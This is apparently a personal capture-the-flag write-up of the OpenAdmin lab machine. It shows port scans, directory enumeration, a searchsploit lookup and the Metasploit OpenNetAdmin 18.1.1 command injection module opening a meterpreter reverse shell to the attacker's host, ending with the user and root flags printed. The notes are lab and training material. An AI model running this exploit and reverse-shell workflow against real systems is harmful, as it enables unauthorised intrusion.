OpenAdmin IP:10.10.10.171


rustscan:

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack



nmap:

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b98df85d17ef03dda48cdbc9200b754 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dcadca3c11315b6fe6a489347c9be550 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



gobuster:

gobuster dir -u 10.10.10.171 -w /usr/share/wordlists/dirb/common.txt -t 64
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.171
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/03 15:34:07 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10918]
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/05/03 15:34:15 Finished
===============================================================


nikto:

ikto -h 10.10.10.171
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.10.171
+ Target Hostname:    10.10.10.171
+ Target Port:        80
+ Start Time:         2023-05-03 15:31:25 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 597dbd5dcea8b, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8046 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-05-03 15:39:27 (GMT3) (482 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested




easy win?

 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 3   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 4   exploit/linux/local/nested_namespace_idmap_limit_priv_esc           Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 6   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
 7   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.





On port 80 thre is a default apache page: Apache2 Ubuntu Default Page

while visiting the page /artwork, we find a blog site with no valuable information. However, when we visit /music and then start free trial, we are presented with a software called OpenNetAdmin v18.1.1
let's try to search for an exploit:

 searchsploit ONA 18.1.1
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                                                                               | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                                                                                | php/webapps/47691.sh
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


there is an interesting exploit using msfconsole:
msf6 > search OpenNetAdmin

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/opennetadmin_ping_cmd_injection

msf6 > use 0
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > show options

Module options (exploit/unix/webapp/opennetadmin_ping_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /ona/login.php   yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target





msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Exploiting...
[*] Sending stage (3045348 bytes) to 10.10.10.171
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.171:50442) at 2023-05-03 15:48:42 +0300
   
whoami
[*] Command Stager progress - 100.00% done (807/807 bytes)

meterpreter > 
meterpreter > whoami
[-] Unknown command: whoami
meterpreter > id
[-] Unknown command: id
meterpreter > ls
Listing: /opt/ona/www
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100664/rw-rw-r--  1970  fil   2018-01-03 19:19:38 +0200  .htaccess.example
040775/rwxrwxr-x  4096  dir   2018-01-03 19:19:38 +0200  config
100664/rw-rw-r--  1949  fil   2018-01-03 19:19:38 +0200  config_dnld.php
100664/rw-rw-r--  4160  fil   2018-01-03 19:19:38 +0200  dcm.php
040775/rwxrwxr-x  4096  dir   2018-01-03 19:19:38 +0200  images
040775/rwxrwxr-x  4096  dir   2018-01-03 19:19:38 +0200  include
100664/rw-rw-r--  1999  fil   2018-01-03 19:19:38 +0200  index.php
040775/rwxrwxr-x  4096  dir   2018-01-03 19:19:38 +0200  local
100664/rw-rw-r--  4526  fil   2018-01-03 19:19:38 +0200  login.php
100664/rw-rw-r--  1106  fil   2018-01-03 19:19:38 +0200  logout.php
040775/rwxrwxr-x  4096  dir   2018-01-03 19:19:38 +0200  modules
040775/rwxrwxr-x  4096  dir   2018-01-03 19:19:38 +0200  plugins
040775/rwxrwxr-x  4096  dir   2018-01-03 19:19:38 +0200  winc
040775/rwxrwxr-x  4096  dir   2018-01-03 19:19:38 +0200  workspace_plugins

meterpreter > 

 so now we got a shell:



user flag: a35d01351731623b703e9404e2578c06

root flag: 

meterpreter > sysinfo
Computer     : 10.10.10.171
OS           : Ubuntu 18.04 (Linux 4.15.0-70-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
meterpreter > cat /root/root.txt
ff3dcd500b0fd50a0964218dac24fc05



Listing: /home/joanna
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2023-05-03 15:58:54 +0300  .bash_history
100644/rw-r--r--  220   fil   2019-11-22 20:00:25 +0200  .bash_logout
100644/rw-r--r--  3771  fil   2019-11-22 20:00:25 +0200  .bashrc
040700/rwx------  4096  dir   2021-07-27 09:12:06 +0300  .cache
040700/rwx------  4096  dir   2019-11-23 00:42:07 +0200  .gnupg
100644/rw-r--r--  807   fil   2019-11-22 20:00:25 +0200  .profile
040700/rwx------  4096  dir   2019-11-23 19:31:12 +0200  .ssh
100400/r--------  33    fil   2023-05-03 15:59:16 +0300  user.txt

meterpreter > cat user.txt
a35d01351731623b703e9404e2578c06
meterpreter > 
